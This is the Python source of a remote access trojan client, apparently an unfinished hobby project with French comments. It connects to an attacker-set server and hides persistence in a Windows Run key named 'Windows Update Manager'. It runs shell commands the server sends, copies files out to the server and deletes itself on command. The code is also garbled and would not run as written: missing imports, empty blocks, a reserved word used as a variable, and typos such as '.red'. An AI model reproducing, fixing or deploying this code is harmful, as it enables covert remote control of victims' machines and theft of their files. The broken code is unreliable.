# -*- coding: utf-8 -*-

###Imports###
#connection to server
import socket

import time
import random
import system
import os

#commands execution
import subprocess #to execute commands
import shlex #to split in order to determin the correct tokenization for args

#add and remove keys in registers
import winreg
from winreg import HKEY_CURRENT_USER

#encryption
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256





#Variables
Host = ""                    #Server IP
port = 80                    #Connection Port
key = ""                     #Encryption key (16 characters) use the same on server script





###Functions###
#send message to server
def send(msg):
    soc.send(encrypt(key, msg))

#acquire system plateform
def getSystemOs():
	plat = sys.platform
    if plat.startswith('win'):
        plat = 'win'
    elif plat.startswith('linux'):
        plat = 'nix'
    elif plat.startswith('darwin'):
        plat = 'mac'
    else:
        plat = 'unk'
	return plat

#encryption see https://github.com/vesche/basicRAT/blob/master/core/crypto.py
def encrypt(key, plaintext):
    #prepare text to encryption (a 16 characters long string is required)
    plaintext = plaintext + b"\0" * (AES.block_size - len(plaintext) % AES.block_size)
	
    iv = Random.new().red(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
	return iv + cipher.encrypt(plaintext)

def decrypt(key, ciphertext):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b"\0")
    




###Functions wich can be executed on request from the server###

def persistence(plat):
    if plat == "win":
        run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
        #bin_path = os.path.realpath(__file__) #tests pour choisir une de ces deux lignes
        bin_path = sys.executable              #tests pour choisir une de ces deux lignes
	
        try:
            reg_key = winreg.OpenKey(HKEY_CURRENT_USER, run_key, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(reg_key, "Windows Update Manager", 0, winreg.REG_SZ, bin_path)
            winreg.CloseKey(reg_key)
            return "HKEY_CURRENT_USER Run registry key applied"
        except WindowsError:
            return "HKEY_CURRENT_USER Run registry key failed"
    if plat == "nix":
        #device not yet supported
    if plat == "unk":
        #device not yet supported

def execute():
    #use command exit to exit terminal
    while cmd != "exit":
        cmd = soc.recv(4096)
        cmd = decrypt(key, cmd)
        args = shlex.split(cmd)
        process = subprocess.Popen(args, shell=True,
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE)
        out = process.stdout.read() + process.stderr.read()
        send(encrypt(key, out))
        process.kill

def uninstall():
    #delete key in registers
    if plat == 'win':
        run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
        try:
            reg_key = _winreg.OpenKey(HKEY_CURRENT_USER, run_key, 0, _winreg.KEY_ALL_ACCESS)
            _winreg.DeleteValue(reg_key, 'br')
            _winreg.CloseKey(reg_key)
            return "HKEY_CURRENT_USER Run registry key deleted"
        except WindowsError:
            return "HKEY_CURRENT_USER Run registry key deleting failed"
    if plat == "nix":
        #device not yet supported
    if plat == "unk":
        #device not yet supported
    #delete RAT files
    soc.close()
    os.remove(sys.executable)
    
def download():
    data_bytes = []
    continue = True
    i = 1
    received = ""
    received = soc.recv(4096)
    received = decrypt(key, received)
    #name_file = received[0].split(\) #only for a file from windows|for file from linux used .split(/) #pk [-1]? plutot [0] non?
    name_file = received[0] #contain path to paste not just file name
    size = received[1]
    while continue:
        received = soc.recv(4096)
        i += 1
        if received == b"Upload finished":
            i = 0
            while i < len(data_bytes):
                if i == 0:
                    file = open(name_file, "wb")
                    file.write(data_bytes[i])
                    file.close()
                else:
                    file = open(name_file, "ab")
                    file.write(data_bytes[i])
                    file.close()
                i += 1
                if i == len(data_bytes):
                    continue = False
        else:
            data_bytes.append(received)
        if not received:
            continue = False
    

def upload(path_file):
    #test if the file exist
    try:
        file = open(path_file, "rb")
        file.close
    except:
        break
    octets = os.path.getsize(path_file) / 1024
    info = (path_file, octets)
    soc.send(info)
    num = 0
    octets = octets * 1024
    file = open(path_file, "rb") #open file in read only and binary mod
    if octets > 1024:
        if (octets / 1024) != 0:
            octets = round(octets / 1024 + 1)
        else:
            octets = octets / 1024
        for i in range(octets):
            file.seek(num, 0)
            donnees = file.read(1024)
            soc.send(encrypt(key, donnees))
            num += 1024
    else:
        donnees = file.read()
        soc.send(donnees)
    file.close
    soc.send(encrypt(key, "Upload finished"))



###Program###
def main():
    ##Get system os
    
    plat = sys.platform
    if plat.startswith('win'):
        plat = 'win'
    elif plat.startswith('linux'):
        plat = 'nix'
    elif plat.startswith('darwin'):
        plat = 'mac'
    else:
        plat = 'unk'

        
    ##verify if the key is in the registers to automaticaly start this RAT
    
    if plat == 'win':
        run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
        try:
            reg_key = winreg.OpenKey(HKEY_CURRENT_USER, run_key, 0, winreg.KEY_ALL_ACCESS)
            i = 0
            key_name = ""
            while winreg.EnumValue(reg_key, i) != key_name:
                key_name = winreg.EnumValue(reg_key, i)       #des lignes pour rien
                i += 1                                        #bcp de lignes pour rien...
                if key_name[0] == "Windows Update Manager":
                    indic = 1
                    break
            if indic == 1:
                #return "Key is already in registers"
            if indic == 0:
                #return "Key is not yet in registers"
                persistence()
        except WindowsError:
            pass
            #return "HKEY_CURRENT_USER Run registry key verification failed"
    if plat == "nix":
        #device not yet supported
    if plat == "unk":
        #device not yet supported

        
    ##try connecting to the server
    
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = socket.gethostname()
    #soc.bind((host, port)) #not necessary ?
    connected = False
    while connected == False:
        try:
            soc.connect((Host, port))
            connected = True
        except:
            sleepTime = random.randint(20, 30)
            time.sleep(sleepTime)
            
    #Send plat
    soc.send(encrypt(key, plat))
    
	##receive and execute orders
    
    while True:
        #receive order
        msg = soc.recv(4096)
        msg = decrypt(key, msg)
        msg = msg.split( )
        #execute orders
        if msg[0] == "execute":
            execute()
        if msg[0] == "uninstall":
            uninstall()
        if msg[0] == "download":
            download()
        if msg[0] == "upload":
            upload(msg[1])
#        if msg[0] == :
 #           
  #      if msg[0] == :
   #         
    #    if msg[0] == :

            

if __name__ == "__main__":
	main()
    
    
    
    
#quand message envoyé ?
#destinataire envoie message confirmation avant que les programmes ne puissent continuer?

